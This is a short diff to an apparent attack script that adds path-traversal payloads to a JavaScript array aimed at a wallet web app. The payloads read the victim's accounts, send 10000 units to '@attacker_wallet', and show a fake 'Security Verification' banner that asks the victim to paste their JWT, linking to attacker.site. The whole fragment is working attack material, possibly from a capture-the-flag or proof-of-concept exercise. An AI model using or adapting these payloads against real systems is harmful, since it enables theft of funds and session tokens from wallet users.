@@ -13,7 +13,9 @@
 
 <script>
   const payloads = [
-"../../../wallet/start?banner=verify_phone&title=Security+Verification&text=Session+expired.+Paste+this+token+to+verify%3A+<textarea>{JWT}</textarea>&url=https://attacker.site"
+  "../../../wallet/accounts",
+  "../../../wallet/send?amount=10000&to=@attacker_wallet",
+  "../../../wallet/start?banner=verify_phone&title=Security+Verification&text=Session+expired.+Paste+this+token+to+verify%3A+<textarea>{JWT}</textarea>&url=https://attacker.site"  
   ];
 
   let index = 0;
